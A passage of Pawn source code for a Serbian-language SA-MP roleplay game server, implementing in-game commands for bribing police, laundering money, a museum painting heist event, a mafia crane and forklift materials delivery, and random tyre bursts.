            SavePlayer(playerid);

            return 1;
        }
    }

    return 1;
}

CMD:bribe(playerid) {

    new bribe = BribeTrenutni;
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, BribePozicije[bribe][0], BribePozicije[bribe][1], BribePozicije[bribe][2])) return SendErrorMessage(playerid, "Nisi kod bribe pozicije!");
    if(PlayerInfo[playerid][xWanted] == 0) return SendErrorMessage(playerid, "Nemas wanted!");

    new cena = PlayerInfo[playerid][xWanted] * 2000;
    new string[128];
    format(string, sizeof(string), "Da li si siguran da zelis da platis policajca %d$ da ti ocisti dosije?", cena);

    ShowPlayerDialog(playerid, dialog_Bribe, DIALOG_STYLE_MSGBOX, "Bribe", string, "Da", "Ne");

    return 1;
}

CMD:bribeport(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Nisi ovlascen!");

    new bribe = BribeTrenutni;
    Novi_SetPlayerPos(playerid, BribePozicije[bribe][0], BribePozicije[bribe][1], BribePozicije[bribe][2]);

    SendInfoMessage(playerid, "Uspesno si dosao do bribe pozicije!");

    return 1;
}

CMD:operinovac(playerid, params[])
{
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, -87.9631,-1212.4119,2.8906)) return SendErrorMessage(playerid, "Nisi na mestu gde mozes oprati novac!");
    if(PlayerInfo[playerid][xPrljavNovac] == 0) return SendErrorMessage(playerid, "Nemas prljavog novca!");
    new plata = PlayerInfo[playerid][xPrljavNovac] / 2;
    
    DajIgracuNovac(playerid, plata); 
    PlayerInfo[playerid][xPrljavNovac] = 0;
    // DajPrljavNovac(playerid, PlayerInfo[playerid][xPrljavNovac]);
    SavePlayer(playerid);
    SendInfoMessage(playerid, "Uspesno si oprao prljav novac i dobio %d$!", plata);
    return 1;
}

CMD:pokrenimuzej(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 3) return SendErrorMessage(playerid, "Nisi ovlascen!");
    if(BankaUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka banke u toku!");
    if(ZlataraRobUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka zlatare u toku!");
    if(RolexUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka rolex store-a u toku!");
    if(MuzejPokrenut) return SendErrorMessage(playerid, "Muzej je vec pokrenut!");
    KreirajLiftMuzej();
    KreirajSliku();
    MuzejPokrenut = true;
    LiftDole = true;


    foreach( Player, i ) {
        if( IsPlayerConnected( i ) ) {
            if(GetFactionType(i) == ORG_TIP_PD) {
                SendInfoMessage(i, "U Muzej stize skupa slika! Sve jedinice na lice mesta!");
            }
        }
    }

    defer MuzejSlikaStize();

    return 1;
}

CMD:zaustavimuzej(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 3) return SendErrorMessage(playerid, "Nisi ovlascen!");
    if(!MuzejPokrenut) return SendErrorMessage(playerid, "Muzej nije pokrenut!");

    SendClientMessageToAll(-1, ""col_white"Administrator je zaustavio "col_red"ROB MUZEJA"col_white"!");
    SakrijMuzejTimerTD();

    foreach( Player, i ) {

        if( IsPlayerConnected( i ) ) {
            
            if(NosiSliku[i]) {

                SendInfoMessage(i, "Nisi odneo sliku na vreme!");
                Novi_DisablePlayerCheckpoint(i);
                NosiSliku[i] = false;
            } 
        }
    }

    UnistiLiftMuzej();
    UnistiSliku();
    MuzejPokrenut = false;
    MuzejKrajVreme = 0;
    LiftDole = false;
    DestroyDynamicPickup(MuzejSlikaPickup);

    return 1;
}

CMD:ukradisliku(playerid) {

    if(!MuzejPokrenut) return SendErrorMessage(playerid, "Muzej nije pokrenut!");
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 1881.5425,-1323.2654,49.4141)) return SendErrorMessage(playerid, "Nisi na mestu!");
    if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA) return SendErrorMessage(playerid,"Samo clanovi bande/mafije!");
    if(!SlikaKreirana) return SendErrorMessage(playerid, "Vec je neko uzeo sliku!");

    UnistiSliku();
    NosiSliku[playerid] = true;

    Novi_SetPlayerCheckpoint(playerid, 525.3239,-2563.0830,4.2118, 5.0);

    SendInfoMessage(playerid, "Uspesno si uzeo sliku! Odnesi je na crno trziste!");
    
    SendClientMessageToAll(-1, ""col_red"====================================="col_white" [ VANDREDNE VESTI ] "col_red"=====================================");
    SendClientMessageToAll(-1, ""col_red"REPORTER: "col_white"Kako doznajemo ukradena je slika iz muzeja!");
    SendClientMessageToAll(-1, ""col_red"REPORTER: "col_white"Policija radi opseznu potragu za pociniteljima!");
    SendClientMessageToAll(-1, ""col_red"NAPOMENA: "col_white"Molimo civile da se "col_red"ODMAKNU"col_white" od muzeja!");
    SendClientMessageToAll(-1, ""col_red"===============================================================================================================");

    return 1;
}

stock ClanPolicije(playerid) {

    if(GetFactionType(playerid) == ORG_TIP_PD) return 1;
    else return 0;
}

stock ClanIlegalaca(playerid) {

    if(GetFactionType(playerid) == ORG_TIP_MAFIJA) return 1;
    else if(GetFactionType(playerid) == ORG_TIP_BANDA) return 1;
    else return 0;
}

KreirajLiftMuzej() {

    LiftMuzej[0] = CreateDynamicObject(19370, 1883.433959, -1313.812988, 13.477541, 0.000000, 90.000000, 0.000000, -1, -1, -1, 300.00, 300.00);
    SetDynamicObjectMaterial(LiftMuzej[0], 0, 18646, "matcolours", "grey-80-percent", 0x00000000);
    LiftMuzej[1] = CreateDynamicObject(19370, 1883.433959, -1317.013183, 13.477541, 0.000000, 90.000000, 0.000000, -1, -1, -1, 300.00, 300.00);
    SetDynamicObjectMaterial(LiftMuzej[1], 0, 18646, "matcolours", "grey-80-percent", 0x00000000);
    LiftMuzej[2] = CreateDynamicObject(19370, 1880.184326, -1317.013183, 13.477541, 0.000000, 90.000000, 0.000000, -1, -1, -1, 300.00, 300.00);
    SetDynamicObjectMaterial(LiftMuzej[2], 0, 18646, "matcolours", "grey-80-percent", 0x00000000);
    LiftMuzej[3] = CreateDynamicObject(19370, 1880.184326, -1313.812866, 13.477541, 0.000000, 90.000000, 0.000000, -1, -1, -1, 300.00, 300.00);
    SetDynamicObjectMaterial(LiftMuzej[3], 0, 18646, "matcolours", "grey-80-percent", 0x00000000);
}

UnistiLiftMuzej() {

    for(new muzej = 0; muzej < 4; muzej++) DestroyDynamicObject(LiftMuzej[muzej]);
}

PomeriLiftGore() {

    MoveDynamicObject(LiftMuzej[0], 1883.433959, -1313.812988, 48.297519, 2.0, 0.000000, 90.000000, 0.000000);
    MoveDynamicObject(LiftMuzej[1], 1883.433959, -1317.013183, 48.297519, 2.0, 0.000000, 90.000000, 0.000000);
    MoveDynamicObject(LiftMuzej[2], 1880.184326, -1317.013183, 48.297519, 2.0, 0.000000, 90.000000, 0.000000);
    MoveDynamicObject(LiftMuzej[3], 1880.184326, -1313.812866, 48.297519, 2.0, 0.000000, 90.000000, 0.000000);
}

PomeriLiftDole() {

    MoveDynamicObject(LiftMuzej[0], 1883.433959, -1313.812988, 13.477541, 2.0, 0.000000, 90.000000, 0.000000);
    MoveDynamicObject(LiftMuzej[1], 1883.433959, -1317.013183, 13.477541, 2.0, 0.000000, 90.000000, 0.000000);
    MoveDynamicObject(LiftMuzej[2], 1880.184326, -1317.013183, 13.477541, 2.0, 0.000000, 90.000000, 0.000000);
    MoveDynamicObject(LiftMuzej[3], 1880.184326, -1313.812866, 13.477541, 2.0, 0.000000, 90.000000, 0.000000);
}
stock KreirajSliku() {

    SlikaKreirana = true;
    MuzejSlika = CreateDynamicObject(2257, 1881.801147, -1323.999145, 50.564048, 0.000000, 270.000000, 180.000000, -1, -1, -1, 300.00, 300.00);
    SlikaLabel = CreateDynamic3DTextLabel(""SRVBOJA1SCM"Da ukradete sliku\n"col_white"/ukradisliku",0x9EC73DAA, 1881.5425,-1323.2654,49.4141, 30, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0);
}

stock UnistiSliku() {

    SlikaKreirana = false;
    DestroyDynamicObject(MuzejSlika);
    DestroyDynamic3DTextLabel(SlikaLabel);
}

timer MuzejSlikaStize[60000]() {

    SendClientMessageToAll(-1, ""col_red"====================================="col_white" [ VANDREDNE VESTI ] "col_red"=====================================");
    SendClientMessageToAll(-1, ""col_red"REPORTER: "col_white"U Los Santosu je izlozena slika velike vrednosti!");
    SendClientMessageToAll(-1, ""col_red"REPORTER: "col_white"Vrednost slike je procenjena na 120.000$!");
    SendClientMessageToAll(-1, ""col_red"NAPOMENA: "col_white"Policijske snage su pozvane od strane grada da osiguravaju Muzej u narednih par "col_red"SATI"col_white"!");
    SendClientMessageToAll(-1, ""col_red"===============================================================================================================");

    MuzejKrajVreme = 900;
    OdnetaSlika = false;

    defer MuzejLiftTimer();
    defer MuzejKrajTimer();
    return 1;
}



timer MuzejKrajTimer[1000]() {

    if(MuzejKrajVreme != 0) {

        foreach( Player, i ) {
            if( IsPlayerConnected(i)) {

                if(ClanIlegalaca(i) || ClanPolicije(i)) {

                    SakrijMuzejTimerTD();
                    new string[16];
                    format(string, sizeof(string), "%d_sekundi", MuzejKrajVreme);
                    PrikaziMuzejTimerTD();
                    TextDrawSetString(MuzejTimerTD[3], string);
                }
            }
        }
        MuzejKrajVreme--;
        if(OdnetaSlika) {

            SakrijMuzejTimerTD();
            OdnetaSlika = false;
            UnistiLiftMuzej();
            UnistiSliku();
            MuzejPokrenut = false;
            MuzejKrajVreme = 0;
            LiftDole = false;
            return 1;
        }
        defer MuzejKrajTimer();
    }
    else {

        SendClientMessageToAll(-1, ""col_red"====================================="col_white" [ VANDREDNE VESTI ] "col_red"=====================================");
        SendClientMessageToAll(-1, ""col_red"REPORTER: "col_white"Obavestavamo gradjane da je slika uspesno zasticena od strane "col_red"Policijske Uprave"col_white"!");
        SendClientMessageToAll(-1, ""col_red"REPORTER: "col_white"Za svoje dobro delo, grad ih nagradjuje novcanom nagradom od "col_red"15.000$"col_white" svakom clanu Policije!");
        SendClientMessageToAll(-1, ""col_red"===============================================================================================================");

        SakrijMuzejTimerTD();

        foreach( Player, i ) {

            if( IsPlayerConnected( i ) ) {
                
                if(ClanPolicije(i)) {
                    DajIgracuNovac(i, 15000);
                    SendInfoMessage(i, "Za uspesno sprecavanje pljacke dobio si 15.000$!");
                }
                if(NosiSliku[i]) {

                    SendInfoMessage(i, "Nisi odneo sliku na vreme!");
                    Novi_DisablePlayerCheckpoint(i);
                    NosiSliku[i] = false;
                } 
            }
        }

        UnistiLiftMuzej();
        UnistiSliku();
        MuzejPokrenut = false;
        MuzejKrajVreme = 0;
        LiftDole = false;
        DestroyDynamicPickup(MuzejSlikaPickup);
    }

    return 1;
}

timer MuzejLiftTimer[30000]() {

    if(MuzejPokrenut) {

        if(LiftDole) {

            PomeriLiftGore();
            LiftDole = false;
            defer MuzejLiftTimer();
        } else {

            PomeriLiftDole();
            LiftDole = true;
            defer MuzejLiftTimer();
        }
    }
}

PrikaziMuzejTimerTD() {

    for(new td = 0; td < 4; td++) {

        TextDrawShowForAll(MuzejTimerTD[td]);
    }
}

SakrijMuzejTimerTD() {

    for(new td = 0; td < 4; td++) {

        TextDrawHideForAll(MuzejTimerTD[td]);
    }
}

MuzejTimerTDKreiraj() {

    MuzejTimerTD[0] = TextDrawCreate(530.416992, 215.407531, "box");
    TextDrawLetterSize(MuzejTimerTD[0], 0.000000, 2.291666);
    TextDrawTextSize(MuzejTimerTD[0], 652.000000, 0.000000);
    TextDrawAlignment(MuzejTimerTD[0], 1);
    TextDrawColor(MuzejTimerTD[0], -1);
    TextDrawUseBox(MuzejTimerTD[0], 1);
    TextDrawBoxColor(MuzejTimerTD[0], 170);
    TextDrawSetShadow(MuzejTimerTD[0], 0);
    TextDrawBackgroundColor(MuzejTimerTD[0], 255);
    TextDrawFont(MuzejTimerTD[0], 1);
    TextDrawSetProportional(MuzejTimerTD[0], 1);

    MuzejTimerTD[1] = TextDrawCreate(536.666748, 221.629638, "box");
    TextDrawLetterSize(MuzejTimerTD[1], 0.000000, -0.249999);
    TextDrawTextSize(MuzejTimerTD[1], 641.000000, 0.000000);
    TextDrawAlignment(MuzejTimerTD[1], 1);
    TextDrawColor(MuzejTimerTD[1], -1);
    TextDrawUseBox(MuzejTimerTD[1], 1);
    TextDrawBoxColor(MuzejTimerTD[1], 415014058);
    TextDrawSetShadow(MuzejTimerTD[1], 0);
    TextDrawBackgroundColor(MuzejTimerTD[1], 255);
    TextDrawFont(MuzejTimerTD[1], 1);
    TextDrawSetProportional(MuzejTimerTD[1], 1);

    MuzejTimerTD[2] = TextDrawCreate(540.000061, 221.629608, "Muzej Rob:");
    TextDrawLetterSize(MuzejTimerTD[2], 0.202083, 1.496294);
    TextDrawTextSize(MuzejTimerTD[2], 630.000000, 0.000000);
    TextDrawAlignment(MuzejTimerTD[2], 1);
    TextDrawColor(MuzejTimerTD[2], -1);
    TextDrawSetShadow(MuzejTimerTD[2], 0);
    TextDrawBackgroundColor(MuzejTimerTD[2], 255);
    TextDrawFont(MuzejTimerTD[2], 1);
    TextDrawSetProportional(MuzejTimerTD[2], 1);

    MuzejTimerTD[3] = TextDrawCreate(584.166381, 222.666656, "999 minuta");
    TextDrawLetterSize(MuzejTimerTD[3], 0.200000, 1.351111);
    TextDrawTextSize(MuzejTimerTD[3], 662.000000, 0.000000);
    TextDrawAlignment(MuzejTimerTD[3], 1);
    TextDrawColor(MuzejTimerTD[3], -16776961);
    TextDrawSetShadow(MuzejTimerTD[3], 0);
    TextDrawBackgroundColor(MuzejTimerTD[3], 255);
    TextDrawFont(MuzejTimerTD[3], 1);
    TextDrawSetProportional(MuzejTimerTD[3], 1);

}

timer KreirajMuzejPickup[4000](Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ) {

    MuzejSlikaPickup = CreateDynamicPickup(1550, 1, IgracPosX, IgracPosY, IgracPosZ, -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);
    return 1;
}

task StvaranjeKrana[3600000]() {

    if(KombiMats >= 0) {

        Novi_DestroyVehicle(KombiMats);
    }

    if(Viljuskar[0] >= 0) {

        Novi_DestroyVehicle(Viljuskar[0]);
    }

    if(Viljuskar[1] >= 0) {

        Novi_DestroyVehicle(Viljuskar[1]);
    }

    ResetKran();

    Novi_DestroyVehicle(KombiMats);
    KombiMats = V01D_CreateVehicle(456, 2776.8462, -2438.3835, 13.6709, 90.0000, 0, 0, -1 );
    

    KombiMatsPaketi = 0;

    Novi_DestroyVehicle(Viljuskar[0]);
    Viljuskar[0] = V01D_CreateVehicle(530, 2795.8611, -2441.1609, 13.2730, 0.0000, 0, 0, -1 );
   

    Novi_DestroyVehicle(Viljuskar[1]);
    Viljuskar[1] = V01D_CreateVehicle(530, 2792.4011, -2441.1609, 13.2730, 0.0000, 0, 0, -1 );


    foreach(Player, i) {

        if(GetFactionType(i) == ORG_TIP_MAFIJA) {

            SendClientMessage(i, 0x0085C5FF, "(Kombi Materijali) : {FFFFFF}U dokovima je stigao kombi! Dostavite ga u fabriku oruzija da dobijete materijale!");
        }
    }

    return 1;
}

stock ResetKran() {

    KranUpotreba = false;

    if(IsValidObject(KranObjekat)) {

        DestroyObject(KranObjekat);
    }

    KranObjekat = CreateObject(1388, 2795.88623, -2395.16235, 33.38360,   0.00000, 0.00000, 320.00000);
    KranPozicija = 320;

    for(new i = 0; i < 3; i++) {

        if(IsValidObject(Kontenjeri[i]))
            DestroyObject(Kontenjeri[i]);
    }

    BrojKontenjera = 0;
    KranSpustanje = false;
    KranSpustanje2 = false;
    KranSpustaKutiju = false;

    if(IsValidObject(KranRuka))
        DestroyObject(KranRuka);


    if(IsValidObject(KranKutija))
        DestroyObject(KranKutija);

    foreach(Player, i) {

        if(KoristiKran[i]) {

            KoristiKran[i] = false;
            SetPlayerPos(i, 2793.3655,-2395.2900,17.2745);
            SetCameraBehindPlayer(i);
        }
    }
}

CMD:kran(playerid) {

    if(KoristiKran[playerid]) {

        SetPlayerPos(playerid, 2793.3655,-2395.2900,17.2745);
        SetCameraBehindPlayer(playerid);
        KoristiKran[playerid] = false;
        KranUpotreba = false;
        TogglePlayerControllable(playerid, 1);
        SendInfoMessage(playerid, "Izasao si iz krana!");
        return 1;
    }
    else if(!KoristiKran[playerid]) {

        if(!IsPlayerInRangeOfPoint(playerid, 3.0, 2793.3655,-2395.2900,17.2745)) return SendErrorMessage(playerid, "Nisi na mestu!");
        if(GetFactionType(playerid) != ORG_TIP_MAFIJA ) return SendErrorMessage(playerid, "Moras biti clan mafije!");
        if(KombiMats == -1) return SendErrorMessage(playerid, "Nemas sta da istovaris!");
        if(KranUpotreba) return SendErrorMessage(playerid, "Neko vec koristi kran!");
        if(BrojKontenjera == 3) return SendErrorMessage(playerid, "Vec si spustio maks broj kontenjera!");

        SendInfoMessage(playerid, "Usao si u kran! Koristite tipke 'Y' i 'N' da pomerate kran!");
        SendInfoMessage(playerid, "Potrebno je pokupiti kontenjer sa broda sa tipkom 'SPACE'");
        SendInfoMessage(playerid, "Zatim ga spustiti na obalu! Da izadjete iz krana kucajte /kran");

        KranUpotreba = true;
        KoristiKran[playerid] = true;

        TogglePlayerControllable(playerid, 0);

        SetPlayerCameraPos(playerid, 2774.353759, -2391.813720, 81.676239);
        SetPlayerCameraLookAt(playerid, 2777.247070, -2392.966308, 77.764663, CAMERA_CUT);

        if(PlayerInfo[playerid][xAchivements][8] == 0) {

            achivementPassed(playerid, 8, 4000);
        }
        return 1;
    }

    return 1;
}

ptask PomeranjeKran[100](playerid) {

    if(IsPlayerNPC(playerid)) return 0;
    if(!KoristiKran[playerid]) return 0;

    new
        Keys, ud, lr;
    GetPlayerKeys(playerid, Keys, ud, lr);

    new newkeys = Keys;

    if(HOLDING(KEY_YES)) {

        if(KoristiKran[playerid]) {

            if(KranSpustanje) return 0;
            if(KranSpustaKutiju) return 0;
            if(KranPozicija >= 320) return 0;

            new Float:PozKran[3];
            GetObjectPos(KranObjekat, PozKran[0], PozKran[1], PozKran[2]);
            new Float:RotKran[3];
            GetObjectRot(KranObjekat, RotKran[0], RotKran[1], RotKran[2]);
            MoveObject(KranObjekat, PozKran[0], PozKran[1], PozKran[2], 100, RotKran[0], RotKran[1], RotKran[2]+2);

            KranPozicija = floatround(RotKran[2])+2;

            //SendInfoMessage(playerid, "Debug Left : %d", KranPozicija);

        }
    }

    if(HOLDING(KEY_NO)) {

        if(KoristiKran[playerid]) {

            if(KranSpustanje) return 0;
            if(KranSpustaKutiju) return 0;
            if(KranPozicija <= 150) return 0;

            new Float:PozKran[3];
            GetObjectPos(KranObjekat, PozKran[0], PozKran[1], PozKran[2]);
            new Float:RotKran[3];
            GetObjectRot(KranObjekat, RotKran[0], RotKran[1], RotKran[2]);
            MoveObject(KranObjekat, PozKran[0], PozKran[1], PozKran[2], 100, RotKran[0], RotKran[1], RotKran[2]-2);

            KranPozicija = floatround(RotKran[2])-2;

            //SendInfoMessage(playerid, "Debug Right : %d", KranPozicija);
        }
    }

    if(newkeys == KEY_SPRINT) {

        if(KranSpustanje) return 0;
        if(KranSpustaKutiju) return 0;

        if(KranSpustanje2) { //Spustanje kutije

            new Float:RotKran[3];
            GetObjectRot(KranObjekat, RotKran[0], RotKran[1], RotKran[2]);
            if(RotKran[2] <= 190 && RotKran[2] >= 170) {

                KranSpustaKutiju = true;
                DestroyObject(KranKutija);
                KranKutija = CreateObject(2973, 2795.80200, -2424.50439, 35.30613,   0.00000, 0.00000, 0.00000);
                MoveObject(KranKutija, 2795.80200, -2424.50439, 14.21500, 10.0, 0.00000, 0.00000, 0.00000);

                defer SpustanjeRukeKutija();
            }

        }
        else { //Podizanje Kutije

            if(BrojKontenjera == 3) return SendErrorMessage(playerid, "Vec si spustio maks broj kontenjera! /kran");

            new Float:RotKran[3];
            GetObjectRot(KranObjekat, RotKran[0], RotKran[1], RotKran[2]);
            if(RotKran[2] <= 280 && RotKran[2] >= 260) {

                KranSpustanje = true;
                KranRuka = CreateObject(1387, 2830.13501, -2395.29248, 36.45769,   0.00000, 0.00000, 0.00000);
                MoveObject(KranRuka, 2830.13501, -2395.29248, 17.07019, 10.0,0.00000, 0.00000, 0.00000);
                defer SpustanjeRuke();
            }
        }
    }

    return 1;
}

timer SpustanjeRukeKutija[2000]() {

    KranSpustaKutiju = false;
    DestroyObject(KranKutija);
    KranSpustanje2 = false;

    if(BrojKontenjera == 0) {

        Kontenjeri[0] = CreateObject(2973, 2790.79614, -2423.17017, 12.62290,   0.00000, 0.00000, 2.69500);
        BrojKontenjera++;
        return 1;
    }
    else if(BrojKontenjera == 1) {

        Kontenjeri[1] = CreateObject(2973, 2799.71216, -2422.90918, 12.67157,   0.00000, 0.00000, 0.00000);
        BrojKontenjera++;
        return 1;
    }
    else if(BrojKontenjera == 2) {

        Kontenjeri[2] = CreateObject(2973, 2795.07764, -2422.99194, 12.58050,   0.00000, 0.00000, 13.22090);
        BrojKontenjera++;
        return 1;
    }

    return 1;
}

timer SpustanjeRuke[2000]() {

    KranKutija = CreateObject(2973, 2829.60254, -2395.69751, 15.01870,   0.00000, 0.00000, 90.00000);
    AttachObjectToObject(KranKutija, KranRuka, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1);

    MoveObject(KranRuka, 2830.13501, -2395.29248, 36.45769, 10.0,0.00000, 0.00000, 90.00000);

    defer SpustanjeRuke2();

    return 1;
}

timer SpustanjeRuke2[2000]() {

    KranSpustanje = false;
    KranSpustanje2 = true;

    //Unisti ruku i attach kutiju na kran
    DestroyObject(KranRuka);
    AttachObjectToObject(KranKutija, KranObjekat, 0.0, 28.0, 2.0, 0.0, 0.0, 0.0, 1);

    return 1;
}

CMD:uzmipaket(playerid) {

    if(GetFactionType(playerid) != ORG_TIP_MAFIJA ) return SendErrorMessage(playerid, "Moras biti clan mafije!");
    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");
    if(GetPlayerVehicleID(playerid) != Viljuskar[0] && GetPlayerVehicleID(playerid) != Viljuskar[1]) return SendErrorMessage(playerid, "Moras biti u viljuskaru!");

    if(NosiKutijuMats[playerid]) return SendErrorMessage(playerid, "Vec nosis kutiju!");

    if(IsPlayerInRangeOfPoint(playerid, 2.0, 2799.3389,-2418.4077,13.6308)) { //Prvi [1]

        if(!IsValidObject(Kontenjeri[1])) return SendErrorMessage(playerid, "Ovaj kontenjer nije spusten!");

        DestroyObject(Kontenjeri[1]);

        new viljuska;
        if(GetPlayerVehicleID(playerid) == Viljuskar[0]) viljuska = 0;
        else if(GetPlayerVehicleID(playerid) == Viljuskar[1]) viljuska = 1;

        new Float:Poz[3];
        GetVehiclePos(Viljuskar[viljuska], Poz[0], Poz[1], Poz[2]);

        KutijaAttach[0] = CreateObject(2973, Poz[0], Poz[1], Poz[2],   0.00000, 0.00000, 0.0000);

        AttachObjectToVehicle(KutijaAttach[0], Viljuskar[viljuska], 0, 1.5, 0, 0, 0, 0);

        NosiKutijuMats[playerid] = true;

        NosiBrojMats[playerid] = 0;

        SendInfoMessage(playerid, "Odnesi kutiju na kraj kamiona i pritisni 'N'!");

        return 1;
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2.0, 2794.2107,-2418.5425,13.6321)) { //Drugi [2]

        if(!IsValidObject(Kontenjeri[2])) return SendErrorMessage(playerid, "Ovaj kontenjer nije spusten!");

        DestroyObject(Kontenjeri[2]);

        new viljuska;
        if(GetPlayerVehicleID(playerid) == Viljuskar[0]) viljuska = 0;
        else if(GetPlayerVehicleID(playerid) == Viljuskar[1]) viljuska = 1;

        new Float:Poz[3];
        GetVehiclePos(Viljuskar[viljuska], Poz[0], Poz[1], Poz[2]);

        KutijaAttach[1] = CreateObject(2973, Poz[0], Poz[1], Poz[2],   0.00000, 0.00000, 0.0000);

        AttachObjectToVehicle(KutijaAttach[1], Viljuskar[viljuska], 0, 1.5, 0, 0, 0, 0);

        NosiKutijuMats[playerid] = true;

        NosiBrojMats[playerid] = 1;

        SendInfoMessage(playerid, "Odnesi kutiju na kraj kamiona i pritisni 'N'!");

        return 1;
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2.0, 2790.5408,-2418.6260,13.6330)) { //Treci [0]

        if(!IsValidObject(Kontenjeri[0])) return SendErrorMessage(playerid, "Ovaj kontenjer nije spusten!");

        DestroyObject(Kontenjeri[0]);

        new viljuska;
        if(GetPlayerVehicleID(playerid) == Viljuskar[0]) viljuska = 0;
        else if(GetPlayerVehicleID(playerid) == Viljuskar[1]) viljuska = 1;

        new Float:Poz[3];
        GetVehiclePos(Viljuskar[viljuska], Poz[0], Poz[1], Poz[2]);

        KutijaAttach[2] = CreateObject(2973, Poz[0], Poz[1], Poz[2],   0.00000, 0.00000, 0.0000);

        AttachObjectToVehicle(KutijaAttach[2], Viljuskar[viljuska], 0.0, 1.5, 0, 0, 0, 0);

        NosiKutijuMats[playerid] = true;

        NosiBrojMats[playerid] = 2;

        SendInfoMessage(playerid, "Odnesi kutiju na kraj kamiona i pritisni 'N'!");

        return 1;
    }
    else return SendErrorMessage(playerid, "Nisi kod kontenjera!");
}

CMD:predajmats(playerid) {

    if(GetFactionType(playerid) != ORG_TIP_MAFIJA ) return SendErrorMessage(playerid, "Moras biti clan mafije!");
    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");
    if(GetPlayerVehicleID(playerid) != KombiMats) return SendErrorMessage(playerid, "Moras biti u kombiju sa materijalima!");
    if(KombiMatsPaketi == 0) return SendErrorMessage(playerid, "U kombiju nema paketa!!");

    if(!IsPlayerInRangeOfPoint(playerid, 20.0, 3823.3127,-1152.8422,10.9416)) return SendErrorMessage(playerid, "Nisi blizu fabrike oruzija!");

    Novi_DestroyVehicle(KombiMats);
    KombiMats = -1;

    new mats;

    if(KombiMatsPaketi == 1) {

        mats = RandomNew(10,20);
    }
    else if(KombiMatsPaketi == 2) {

        mats = RandomNew(50,100);
    }
    else if(KombiMatsPaketi == 3) {

        mats = RandomNew(100, 300);
    }

    PlayerInfo[playerid][xMaterijali] += mats;
    SavePlayer(playerid);


    SendInfoMessage(playerid, "Uspesno ste dostavili kombi i dobili %dkg matsa!", mats);
    return 1;
}

DajPrljavNovac(playerid, kolicina) {

    PlayerInfo[playerid][xPrljavNovac] += kolicina;
    SavePlayer(playerid);

    // new string[84];
    // format(string, sizeof(string), "%d$", PlayerInfo[playerid][xPrljavNovac]);
    // PlayerTextDrawHide(playerid, PrljavNovacTD[playerid]);
    // PlayerTextDrawSetString(playerid, PrljavNovacTD[playerid], string);
    // PlayerTextDrawShow(playerid, PrljavNovacTD[playerid]);

    return 1;
}

// ptask PucanjeGumeIgracu[1000](playerid) {

//     if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && GetSpeed(playerid) >= 60) {

//         new id = GetPlayerVehicleID(playerid);
//         if(IsVehicleAuto(id)) {

//             PucanjeGumeBrojac[playerid]++;


//             if(PucanjeGumeBrojac[playerid] >= 240) {

//                 new sansa = random(4);
//                 if(sansa == 1) { //Puca guma

//                     new panels, doors, lights, gume;
//                     GetVehicleDamageStatus(id, panels, doors, lights, gume);
//                     if(gume != 0) return 1;
//                     PucanjeGumeBrojac[playerid] = 0;
//                     UpdateVehicleDamageStatus(id, panels, doors, lights, 1);
//                     SendInfoMessage(playerid, "Pukla ti je guma! Koristi /popravivozilo");
//                     return 1;
//                 }
//                 PucanjeGumeBrojac[playerid] = 0;
//             }
//         }
//     }
//     return 1;
// }

ptask PucanjeGumeIgracu[1000](playerid) {

    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && GetSpeed(playerid) >= 60) {

        new id = GetPlayerVehicleID(playerid);
        if(IsVehicleAuto(id)) {

            PucanjeGumeBrojac[playerid]++;
            switch(PlayerInfo[playerid][xSkillDrive]) {

                case 0: {

                    if(PucanjeGumeBrojac[playerid] >= 160) {

                        new sansa = random(2);
                        if(sansa == 1) { //Puca guma

                            new panels, doors, lights, gume;
                            GetVehicleDamageStatus(id, panels, doors, lights, gume);
                            if(gume != 0) return 1;
                            PucanjeGumeBrojac[playerid] = 0;
                            UpdateVehicleDamageStatus(id, panels, doors, lights, 1);
                            SetVehicleHealth(id, 900);
                            SendInfoMessage(playerid, "Pukla ti je guma! Koristi /popravivozilo");
                            return 1;
                        }
                        PucanjeGumeBrojac[playerid] = 0;
                        return 1;
                    }
                    return 1;
                }
                case 1: {

                    if(PucanjeGumeBrojac[playerid] >= 240) {

                        new sansa = random(2);
                        if(sansa == 1) { //Puca guma

                            new panels, doors, lights, gume;
                            GetVehicleDamageStatus(id, panels, doors, lights, gume);
                            if(gume != 0) return 1;
                            PucanjeGumeBrojac[playerid] = 0;
                            UpdateVehicleDamageStatus(id, panels, doors, lights, 1);
                            SetVehicleHealth(id, 900);
                            SendInfoMessage(playerid, "Pukla ti je guma! Koristi /popravivozilo");
                            return 1;
                        }
                        PucanjeGumeBrojac[playerid] = 0;
                        return 1;
                    }
                    return 1;
                }
                case 2: {

                    if(PucanjeGumeBrojac[playerid] >= 320) {

                        new sansa = random(3);
                        if(sansa == 1) { //Puca guma

                            new panels, doors, lights, gume;
                            GetVehicleDamageStatus(id, panels, doors, lights, gume);
                            if(gume != 0) return 1;
                            PucanjeGumeBrojac[playerid] = 0;
                            UpdateVehicleDamageStatus(id, panels, doors, lights, 1);
                            SetVehicleHealth(id, 900);
                            SendInfoMessage(playerid, "Pukla ti je guma! Koristi /popravivozilo");
                            return 1;
                        }
